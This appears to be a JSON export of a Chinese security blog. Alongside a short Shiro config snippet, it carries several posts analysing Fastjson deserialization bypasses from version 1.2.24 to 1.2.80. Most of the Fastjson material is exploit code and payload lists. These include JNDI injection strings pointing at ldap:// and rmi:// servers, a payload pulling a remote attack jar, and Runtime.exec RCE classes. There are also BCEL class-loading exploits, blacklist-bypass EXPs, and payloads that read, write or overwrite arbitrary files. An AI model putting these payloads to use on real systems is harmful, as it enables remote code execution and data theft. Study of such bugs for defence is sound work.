anon：无需认证即可访问 authc：必须认证才能访问 user：必须拥有rememberme才能访问 perms：拥有对某个资源的权限才能访问 roles：拥有某个角色权限才能访问 那么接下来开始配置，配置后ShiroConfig#getShiroFilterFactoryBean方法如下： 12345678910111213@Beanpublic ShiroFilterFactoryBean getShiroFilterFactoryBean(@Qualifier(&quot;securityManager&quot;) DefaultWebSecurityManager securityManager) &#123; ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean(); // 关联安全管理器 bean.setSecurityManager(securityManager); // 配置过滤器 LinkedHashMap&lt;String, String&gt; filterMap = new LinkedHashMap&lt;&gt;(); filterMap.put(&quot;/user/add&quot;, &quot;anon&quot;); filterMap.put(&quot;/user/update&quot;, &quot;authc&quot;); bean.setFilterChainDefinitionMap(filterMap); return bean;&#125; 此时访问update提示404，而add则不需要，说明拦截已经生效了。","categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"Shiro","slug":"Shiro","permalink":"http://example.com/tags/Shiro/"}]},{"title":"浅述Fastjson(3)：FastJson 1.2.80利用","slug":"FastJson-1-2-80利用","date":"2025-08-10T13:23:49.000Z","updated":"2025-08-10T13:52:08.211Z","comments":true,"path":"2025/08/10/FastJson-1-2-80利用/","permalink":"http://example.com/2025/08/10/FastJson-1-2-80%E5%88%A9%E7%94%A8/","excerpt":"","text":"1.2.80绕过1.2.80的绕过方式和1.2.68的绕过方式一样，同样是基于期望类进行绕过，但是期望类不同。1.2.80使用的是java.lang.Throwable这个类。 参考文章：fastjson 1.2.80 漏洞浅析及利用payload - PYkiller - 博客园 这里直接给出payload 可以看到这里执行了两个字符串，那么在实际应用过程中，需要将这两个分别执行。 123456789101112131415161718192021222324252627282930public static void main(String[] args) &#123; String json =&quot;&#123;n&quot; + &quot; &quot;@type&quot;:&quot;java.lang.Exception&quot;,n&quot; + &quot; &quot;@type&quot;:&quot;org.codehaus.groovy.control.CompilationFailedException&quot;,n&quot; + &quot; &quot;unit&quot;:&#123;n&quot; + &quot; &#125;n&quot; + &quot;&#125;&quot;; try &#123; // 反序列化将org.codehaus.groovy.control.ProcessingUnit 加入白名单 JSON.parse(json); &#125; catch (Exception e) &#123; //e.printStackTrace(); &#125; json = &quot;&#123;n&quot; + &quot; &quot;@type&quot;:&quot;org.codehaus.groovy.control.ProcessingUnit&quot;,n&quot; + &quot; &quot;@type&quot;:&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;,n&quot; + &quot; &quot;config&quot;:&#123;n&quot; + &quot; &quot;@type&quot;: &quot;org.codehaus.groovy.control.CompilerConfiguration&quot;,n&quot; + &quot; &quot;classpathList&quot;:[&quot;http://127.0.0.1:8000/attack-1.jar&quot;]n&quot; + &quot; &#125;,n&quot; + &quot; &quot;gcl&quot;:null,n&quot; + &quot; &quot;destDir&quot;: &quot;/tmp&quot;n&quot; + &quot;&#125;&quot;; // 反序列化将执行 JSONObject.parse(json);&#125; 其中attack-1.jar来自[Lonely-night/fastjsonVul: fastjson 80 远程代码执行漏洞复现](https://github.com/Lonely-night/fastjsonVul) 将代码克隆到本地后，修改attack\\src\\main\\java\\groovy\\grape\\GrabAnnotationTransformation2中Runtime执行的命令，这里原始命令是mac的命令，根据系统进行修改，然后通过maven菜单打包为jar包即可 打包后的jar包存在target目录中，将其部署到服务中，运行payload即可看到效果。 这里有点厌倦了，不描述执行流程了。","categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"FastJson反序列化","slug":"FastJson反序列化","permalink":"http://example.com/tags/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"浅述Fastjson(3)：FastJson 1.2.68及之前利用","slug":"FastJson-1-2-68及之前利用","date":"2025-08-07T13:37:25.000Z","updated":"2025-08-07T15:30:21.613Z","comments":true,"path":"2025/08/07/FastJson-1-2-68及之前利用/","permalink":"http://example.com/2025/08/07/FastJson-1-2-68%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/","excerpt":"","text":"1.2.47修复在1.2.48中，针对1.2.47的缓存绕过，修复了两个地方： MiscCodec类 TypeUtils类 MiscCodec修复1.2.47及之前，在解析java.lang.Class类的时候默认cache为true，导致第二次反序列化时可以直接从缓存中获取。而1.2.48强制关闭，不再加入缓存。 TypeUtils修复1.2.47的无参&#x2F;单参loadClass默认cache为true，1.2.48全部改为false 1.2.68及之前可利用链在1.2.68的期望类绕过之前的利用链，都需要开启AutoType，并且结合未拉黑的利用链，这里不再过多赘述。payload来自safe6sec师傅的：safe6Sec&#x2F;Fastjson: Fastjson姿势技巧集合，利用时还需要满足依赖包版本 1.2.59版本12&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125; 1.2.61版本1&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;Object&quot;:&quot;a&quot;&#125; 1.2.62版本123&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://127.0.0.1:1098/exploit&quot;&#125;&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125; 1.2.62-1.2.66版本123&#123;&quot;@type&quot;:&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&quot;xaDataSourceName&quot;:&quot;rmi://10.10.20.166:1099/ExportObject&quot;&#125;&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://10.10.20.166:1389/ExportObject&quot;&#125; fastjson &lt;&#x3D;1.2.66123456789101112&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://192.168.80.1:1399/Calc&quot;&#125;&#125; jdk11以上写文件： 1234567891011121314151617181920&#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;sun.rmi.server.MarshalOutputStream&quot;, &quot;out&quot;: &#123; &quot;@type&quot;: &quot;java.util.zip.InflaterOutputStream&quot;, &quot;out&quot;: &#123; &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;, &quot;file&quot;: &quot;/tmp/asdasd&quot;, &quot;append&quot;: true &#125;, &quot;infl&quot;: &#123; &quot;input&quot;: &#123; &quot;array&quot;: &quot;eJxLLE5JTCkGAAh5AnE=&quot;, &quot;limit&quot;: 14 &#125; &#125;, &quot;bufLen&quot;: &quot;100&quot; &#125;, &quot;protocolVersion&quot;: 1&#125; 1.2.67版本123&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125; 1.2.68期望类绕过在1.2.68版本终于突破了需要开启AutoType以及利用链不在黑名单的限制。通过期望类来绕过了checkAutoType。 利用条件 利用类必须是expectClass的子类 该类不在黑名单中 常用的期望类是AutoCloseable这个类，传入一个子类作为期望类，然后传入另一个子类作为恶意类执行恶意操作。 原理分析新建一个恶意类 1234567891011121314151617import java.io.IOException;public class RCE implements AutoCloseable&#123; public RCE(String cmd) &#123; try &#123; Runtime.getRuntime().exec(cmd); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Override public void close() throws Exception &#123; &#125;&#125; payload如下： 123456public static void main(String[] args) &#123; //ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String s = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.AutoCloseable\\&quot;,\\&quot;@type\\&quot;:\\&quot;RCE\\&quot;,\\&quot;cmd\\&quot;:\\&quot;calc\\&quot;&#125;&quot;; JSON.parseObject(s);&#125; 在checkAutoType处下断点，调试运行payload 停留在断点时的typeName为java.lang.AutoCloseable 进入方法看看是如何绕过的 前面的判断基本不满足，一直运行到当运行到从缓存中读取类时，这里是能够获取到AutoClaseable的 因为在TypeUtils初始化是就将AutoCloseable进行了加载 那么此时clazz就有值了，继续往下执行，这里判断clazz是否为空，然后期望类是否不为空。然后对clazz进行了返回 返回之后就跳出了CheckAutoType，那么再来看看我们构造的恶意类是在哪里加载执行的 一直向下运行，进入 deserializer.deserialze()这里 运行到这里，通过lexer解析器获取了传入的恶意类名 然后在下面这处位置获得了期望类 接着又进入了checkAutoType，但是此时加载的类变成了RCE，并且存在了期望类 然后一直执行，最后是在下面这段代码中获得了RCE.class文件的字节码 这里是先获得字节码路径，如果默认类加载器，就用默认类读取资源，但是这里是null，那么就进入了else分支，通过当前类的类加载器去读取资源，然后获取到字节流 此时有了字节流is，然后通过ClassReader解析字节流，然后通过TypeCollector收集类中的信息，这里是在收集&lt;clinit&gt;，表示类静态代码块static&#123;&#125;，new Class[0]表示0个参数，这里是为了检查静态代码块中是否存在安全问题、检查是否设计JSON相关的注解处理等 然后继续执行，在下面这段代码中完成了类的加载 然后在后面对类进行了返回 利用payload在实际的应用中，并没有RCE这个类能够直接用，需要找到其他AutoCloseable的子类，比如读文件写文件等操作类都继承了这个类，所以这里常用的也是用来读写文件。 其他依赖实现RCE 123&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125; 读文件 1&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;C:/Windows/win.ini&quot;, &quot;targetPath&quot;:&quot;D:/wamp64/www/win.txt&quot;&#125; 写入空文件或者覆盖文件 123456&#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;, &quot;file&quot;: &quot;/tmp/nonexist&quot;, &quot;append&quot;: &quot;false&quot;&#125; 123456&#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;java.io.FileWriter&quot;, &quot;file&quot;: &quot;/tmp/nonexist&quot;, &quot;append&quot;: &quot;false&quot;&#125; 写文件 123456789101112131415161718192021222324&#123; &quot;stream&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;targetPath&quot;: &quot;D:/wamp64/www/hacked.txt&quot;, &quot;tempPath&quot;: &quot;D:/wamp64/www/test.txt&quot; &#125;, &quot;writer&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;, &quot;buffer&quot;: &quot;cHduZWQ=&quot;, // 这里文件内容需要base64编码 &quot;outputStream&quot;: &#123; &quot;$ref&quot;: &quot;$.stream&quot; &#125;, &quot;position&quot;: 5 &#125;, &quot;close&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;, &quot;out&quot;: &#123; &quot;$ref&quot;: &quot;$.writer&quot; &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829&#123; &#x27;stream&#x27;: &#123; &#x27;@type&#x27;:&quot;java.lang.AutoCloseable&quot;, &#x27;@type&#x27;:&#x27;java.io.FileOutputStream&#x27;, &#x27;file&#x27;:&#x27;/tmp/nonexist&#x27;, &#x27;append&#x27;:false &#125;, &#x27;writer&#x27;: &#123; &#x27;@type&#x27;:&quot;java.lang.AutoCloseable&quot;, &#x27;@type&#x27;:&#x27;org.apache.solr.common.util.FastOutputStream&#x27;, &#x27;tempBuffer&#x27;:&#x27;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&#x27;, &#x27;sink&#x27;: &#123; &#x27;$ref&#x27;:&#x27;$.stream&#x27; &#125;, &#x27;start&#x27;:38 &#125;, &#x27;close&#x27;: &#123; &#x27;@type&#x27;:&quot;java.lang.AutoCloseable&quot;, &#x27;@type&#x27;:&#x27;org.iq80.snappy.SnappyOutputStream&#x27;, &#x27;out&#x27;: &#123; &#x27;$ref&#x27;:&#x27;$.writer&#x27; &#125; &#125;&#125; jdk8&#x2F;10写文件 1234567891011121314151617&#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;sun.rmi.server.MarshalOutputStream&quot;, &quot;out&quot;: &#123; &quot;@type&quot;: &quot;java.util.zip.InflaterOutputStream&quot;, &quot;out&quot;: &#123; &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;, &quot;file&quot;: &quot;dst&quot;, &quot;append&quot;: &quot;false&quot; &#125;, &quot;infl&quot;: &#123; &quot;input&quot;: &quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot; &#125;, &quot;bufLen&quot;: 1048576 &#125;, &quot;protocolVersion&quot;: 1&#125; 更多payload请看safe6sec师傅的文章。","categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"FastJson反序列化","slug":"FastJson反序列化","permalink":"http://example.com/tags/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"浅述Fastjson(2)：FastJson 1.2.47及之前利用","slug":"FastJson-1-2-47及之前利用","date":"2025-08-04T15:25:56.000Z","updated":"2025-08-05T17:00:47.410Z","comments":true,"path":"2025/08/04/FastJson-1-2-47及之前利用/","permalink":"http://example.com/2025/08/04/FastJson-1-2-47%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/","excerpt":"","text":"Fastjson1.2.24利用点分析在前篇中讲述了fastjson的反序列化流程，能看出来与java原生反序列化的不同点 fastjson反序列化的类不需要实现序列化接口 原生反序列化时属性不能被transient修饰，fastjson没有这个要求。但是必须有对应的set或者public或者满足条件的get 原生反序列化入口是readObject，fastjson是通过反射调用setter/getter方法实现 get方法要被调用需要满足两个条件： 返回值满足条件并且属性没有set方法 调用parseObject能够正常运行到JSON.toJSON中，前面的parse方法不报错 也就是说只需要找到一个类，它的getter/setter方法能够执行到恶意操作，就能够进行利用。 这里存在三种方式。 JDBC利用 BCEL利用 templateImpl利用 JDBC利用JDBC利用其实就是JNDI注入，所以会受到java版本限制 并且需要出网外联到vps，本质是远程类加载 利用分析在JdbcRowSetImpl#connect方法中存在JNDI注入，可以看到lookup的参数是this.getDataSourceName()，这里传入恶意远程类即可 而getDataSourceName是一个get方法，那么需要set方法进行赋值，然后get方法才能获取到值 可以看到，直接给set方法代表的属性名传参即可 那么此时赋值已经处理好了，但是connect方法还没被调用，还需要找到一处set/get方法调用。 查找用法，发现在set/get中均有调用，这里采用set方法 setAutoCommit方法接收一个布尔值作为参数，可以看到这里进入else选项就会调用到connect 构造EXP此时已经能够满足赋值、调用，可以开始构造EXP了 首先需要是一个json格式，需要用@type指定反序列化的类。然后需要传入属性名以及对应的值，fastjson会根据属性去寻找对应的set/get方法 那么这里需要传入的类就是com.sun.rowset.JdbcRowSetImpl。但是这个类的方法名是setDataSourceName，变量名Field却是dataSource，应该选择哪个名字传入呢？这里需要传入DataSourceName，fastjson是根据传入的属性名去寻找set方法，跟类本身的属性没关系。传入时大小写都可以，fastjson本身会处理大小写关系。然后这里setDataSourceName传入的就是jndi地址。 jndi直接用yakit生成即可 最后还需要传入调用点setAutoCommit的参数，这里需要传入一个布尔值 那么构造出的EXP如下： 1234public static void main(String[] args) throws Exception &#123; String s = &quot;&#123;&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;DataSourceName&quot;: &quot;ldap://192.168.139.128:8085XyoUAXUm&quot;, &quot;AutoCommit&quot;: false&#125;&quot;; JSON.parseObject(s);&#125; BCEL利用这条链需要tomcat-dbcp这个依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt; // tomcat 7的时候就叫dbcp &lt;version&gt;9.0.20&lt;/version&gt;&lt;/dependency&gt; 利用分析执行点在tomcat-dbcp这个依赖中有一个类ClassLoader，看名字就知道是用于类加载的，里面存在一个loadClass方法，这个方法会将满足条件的类名，通过defineClass从创建一个类 第一个判断if((cl=(Class)classes.get(class_name))是从缓存中查找类 for循环for(int i=0; i &lt; ignored_packages.length; i++)这里是如果目标类是指定包中ignored_packages的就进行加载 如果这两个方式都没有获得类字节码，就会进入if(cl == null)的代码中，然后判断类名是否包含$$BCEL$$，包含则会通过createClass创建 所以如果要通过createClass创建，类名中必须包含$$BCEL$$，看看createClass这个方法是怎么操作的。 首先找到这个特殊字符串的其实索引，然后截取索引之后的字符串，获得real_name参数，然后对这个参数进行解码，解码之后获得了字节数组，然后这个字节数组通过new ClassParser(new ByteArrayInputStream(bytes), &quot;foo&quot;);解析字节数组中的数据信息，经过操作之后进行返回。 从这里可以看出，loadClass接受的class_name由两部分组成： $$BCEL$$标识位 经过特定编码的类的字节数组 此时可以尝试构造代码看看这段是否能够执行恶意代码 创建一个恶意类，有参构造方法执行calc，然后使用BCEL中的方式转换，loadClass的时候进行组合，最后实例化，此时执行了有参构造表示能够成功利用。 123456RCE rce = new RCE(&quot;calc&quot;); JavaClass javaClass = Repository.lookupClass(rce.getClass());String code = Utility.encode(javaClass.getBytes(), true);ClassLoader bcelClassLoader = new ClassLoader();Class&lt;?&gt; clazz = bcelClassLoader.loadClass(&quot;$$BCEL$$&quot; + code);clazz.newInstance(); 查找调用BasicDataSource#createConnectionFactory既然能够成功执行，那么就需要查找ClassLoader#loadClass的调用了，这里找到了BasicDataSource#createConnectionFactory这个方法。 这里是在driverFromCCL = Class.forName(driverClassName, true, driverClassLoader);这处代码进行调用，这里的class.forName底层也是通过loadClass进行获取。 如果driverClassLoader不为空，就会调用driverClassLoader去加载driverClassName。 那么如果让这里的driverClassLoader为构造的bcelClassLoader，driverClassName是&quot;$$BCEL$$&quot; + code，就能够执行到恶意方法动态加载一个类 那现在需要看看这两个值是否可控。 很好的是，这两个值都存在对应的set方法。 那么接下来就需要查找createConnectionFactory的调用了 起点BasicDataSource#getConnectioncreateConnectionFactory这个方法被BasicDataSource#createDataSource调用，而createDataSource又被多个get\\set方法调用 这里选择getConnection作为起点 此时可以尝试构造EXP了 构造EXP需要指定的类：org.apache.tomcat.dbcp.dbcp2.BasicDataSource，入口getConnection会自动执行，并且无需参数。然后会调用到createConnectionFactory，这里需要设置两个值，driverClassLoader和driverClassName。 那么此时构造出EXP如下： 123456RCE rce = new RCE(&quot;calc&quot;);JavaClass javaClass = Repository.lookupClass(rce.getClass());String code = Utility.encode(javaClass.getBytes(), true);String bcelCode = &quot;$$BCEL$$&quot; + code;String b = &quot;&#123;\\&quot;@type\\&quot;: \\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\&quot;, \\&quot;DriverClassName\\&quot;: &quot; + bcelCode + &quot;\\&quot;, \\&quot;DriverClassLoader\\&quot;: &#123;\\&quot;@type\\&quot;: \\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\\&quot;&#125;&#125;&quot;;JSON.parseObject(b); 实际利用时在本地获取到bcelCode的字符串，放入payload即可 template利用(无利用价值)template这里在之前的CC链中有提到，但是其中很多属性没有set/get方法进行赋值，所以默认情况下无法使用，只有当开启了JSON.parseObject(b, Feature.SupportNonPublicField);这个配置之后，这些变量才能正常反序列化。所以这里不做分析。 1.2.25更新checkAutoType分析流程分析在1.2.25版本中，当执行到匹配@type的时候，也就是如下代码，此时会进入一个新增的checkAutoType函数，并且后续的很多更新都是基于这个函数。 可以看到这个函数获取到typeName也就是类名，返回值是clazz，也就是说在这里面进行了校验，通过之后再进行加载。那么看看这个方法执行了哪些操作。 进入方法，首先判断typeName如果为空就直接返回null，不为空则继续执行，然后会替换类名中的$为.，这是为了兼容写法 然后会进入一个大的判断，autoTypeSupport是1.2.25新加的属性，作为@type的开关使用。如果这里开启了autoTypeSupport或者期望类不为空，那么就进入黑白名单。如果在白名单中，直接返回clazz，在黑名单中则抛出异常。 这里的黑名单是写死的，具体有以下包名 123456789101112131415161718bsh,com.mchangecom.sun.java.lang.Threadjava.net.Socketjava.rmi,javax.xmlorg.apache.bcelorg.apache.commons.beanutilsorg.apache.commons.collections.Transformerorg.apache.commons.collections.functorsorg.apache.commons.collections4.comparators,org.apache.commons.fileuploadorg.apache.myfaces.context.servletorg.apache.tomcatorg.apache.wicket.utilorg.codehaus.groovy.runtimeorg.hibernate,org.jbossorg.mozilla.javascriptorg.python.coreorg.springframework 如果不满足判断或者不在黑白名单中，则继续执行。这里其实都是在缓存中查找。我们传入的要执行的类是不在缓存中的。所以继续向下执行。 让后这里在如果已经获取到clazz，并且满足期望类不为空且目标类与期望类没有关系，则会抛出异常，也就是说如果存在期望类，并且目标类和期望类之间存在关系，则会直接返回。 继续向下执行，这里如果没打开@type，会再次使用黑白名单尝试进行类加载。 继续向下执行到最后一个部分，首先是如果开启@type，或者存在期望类，则直接加载类。 向下执行，如果clazz!=null，表示已经加载到了类，并且是基于期望类的类，就会直接返回。 如果不是就继续向下执行，最后检测如果没有开启@type，则会抛出异常。如果开启，则返回clazz checkAutoType总结在该方法中，能够加载类并且返回需要满足一下某个条件： 类位于白名单 类在缓存中，并且满足后续部分条件能够进行返回。 执行到最后，满足期望类不为空并且目标类满足期望类。 开启@type，即autoTypeSupport为true。 1.2.25-1.2.41版本绕过原理简析该利用需要开启AutoType，在fastjson反序列化过程中，运行到loadClass时会自动去除类名前后的L和;，利用这个特性。在类名前后那么此时类就绕过了黑白名单检查。 继续向下执行，查找缓存也没有。 在未开启AutoType的判断中进入黑白名单。这里直接绕过了。 然后在开启AutoType的判断中完成了类加载。 最后进行返回。 绕过EXP12345public static void main(String[] args) throws Exception &#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String s = &quot;&#123;&quot;@type&quot;: &quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;, &quot;DataSourceName&quot;: &quot;ldap://192.168.139.128:8085XyoUAXUm&quot;, &quot;AutoCommit&quot;: false&#125;&quot;; JSON.parseObject(s);&#125; 1.2.25-1.2.42版本绕过原理简析同样需要开启AutoType，在1.2.42中，将原本的黑名单改成了hash黑名单，这样就无法直接看到黑名单中的类。 当运行到checkAutoType中，会对类名进行hash计算，这里计算大概是基于类名前几位，然后依次向后计算。 这里绕过同样是基于去除L和;的特性。 在loadClass中，去除了L和;，然后会继续调用当前loadClass，也就是说如果第一次去除之后，调用本身方法，又进行这个判断，如果还有就继续去除，直到没有为止。 那么这里就可以一直写，直到绕过hash名单 1234if(className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;))&#123; String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader);&#125; 绕过EXP这里的L和;可以重复写很多次。 12345public static void main(String[] args) throws Exception &#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String s = &quot;&#123;&quot;@type&quot;: &quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;, &quot;DataSourceName&quot;: &quot;ldap://192.168.139.128:8085XyoUAXUm&quot;, &quot;AutoCommit&quot;: false&#125;&quot;; JSON.parseObject(s);&#125; 1.2.25-1.2.43版本绕过原理简析还是需要开启checkAutoType。 在1.2.43版本中，使用多些L、;会产生报错，简单来说多写已经多写已经不能绕过hash名单了。但是在loadClass中还处理了[这个符号，当遇到这个符号的时候会将类名当作数组处理，将数组中第一个值当作类名再次调用本方法。 那么在类名前面添加[能否绕过呢？ 经测试还是不行，但是报错不一样了 这里的报错在DefaultJSONParser.parseArray(DefaultJSONParser.java:675) 调试到这个部分，在过程中发现已经绕过了原本的名单检测，那么解决了这个报错是否就能正常加载呢？ 可以看到问题出在下面这部分代码，运行到此处时,token为16，16表示为,，但是LBRACKET为14，这里的LBRACKET其实就是[，lexer.token()可以简单理解为当前解析到的特殊符号，如果执行了nextToken()就会移动到下一个符号 123if (token != JSONToken.LBRACKET) &#123; throw new JSONException(&quot;exepct &#x27;[&#x27;, but &quot; + JSONToken.name(token) + &quot;, &quot; + lexer.info());&#125; 那么在,前面添加一个LBRACKET代表的[再试试，此时又产生了新的报错 报错产生位置是位于JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:451)，具体是在下面代码产生的 1234567891011121314151617181920212223if (token != JSONToken.LBRACE &amp;&amp; token != JSONToken.COMMA) &#123; if (lexer.isBlankInput()) &#123; return null; &#125; ...... StringBuffer buf = (new StringBuffer()) // .append(&quot;syntax error, expect &#123;, actual &quot;) // .append(lexer.tokenName()) // .append(&quot;, pos &quot;) // .append(lexer.pos()); if (fieldName instanceof String) &#123; buf // .append(&quot;, fieldName &quot;) // .append(fieldName); &#125; buf.append(&quot;, fastjson-version &quot;).append(JSON.VERSION); throw new JSONException(buf.toString());&#125; 这里进入了判断，就会产生报错，那么如果不满足这个判断，是否就不会产生报错呢 当前token为4，是一个字符。而LBRACE是12，即&#123;，那么想办法改变这个token就好了，在之前添加的[后面添加一个&#123;就好了（这里不太清楚为什么，lexer这块不太了解） 绕过EXP总之最后构造的EXP如下： 1234567public static void main(String[] args) &#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String s = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;[com.sun.rowset.JdbcRowSetImpl\\&quot;[&#123;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://192.168.139.128:8085/XxuKkVJW\\&quot;, \\&quot;autoCommit\\&quot;:true&#125;&quot;; JSON.parseObject(s);&#125; 1.2.25-1.2.45版本绕过原理简析这个版本把之前的绕过手法都修复了，但是可以借助第三方绕过。 同样需要开启AutoType，并且需要mybatis组件在3.x.x到3.5.0 在org.apache.ibatis.datasource.jndi.JndiDataSourceFactory这个类的setProperties方法中，调用了InitialContext.lookup()，可以看到这里存在一个jndi注入，那么这里向1.2.24中利用JdbcRowSetImpl一样构造即可 绕过EXP1String s = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\\&quot;,\\&quot;properties\\&quot;:&#123;\\&quot;data_source\\&quot;:\\&quot;rmi://192.168.139.128:8085/XxuKkVJW\\&quot;&#125;&#125;&quot;; 1.2.25-1.2.47版本绕过原理浅析1.2.47及版本之前都可以使用缓存绕过，但是在使用时存在两个版本范围 1.2.25-1.2.32：这个版本如果之间如果未开启autotype可以直接利用，开启AutoType就需要对JdbcRowSetImpl进行绕过黑白名单处理，比如L、； 1.2.33-1.2.47：这个版本区间不管是否开启AutoType都可以利用 从缓存查询位于如下代码： 1234Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);if (clazz == null) &#123; clazz = deserializers.findClass(typeName);&#125; 这个getClassFromMapping其实就是在mappings里面找，那我们看看mappings的调用，看在什么情况下，会往缓存中存放值 123public static Class&lt;?&gt; getClassFromMapping(String className) &#123; return mappings.get(className);&#125; 这里找到四处调用mappings的地方，其中存在存放值也就是put操作的地方只有两个方法 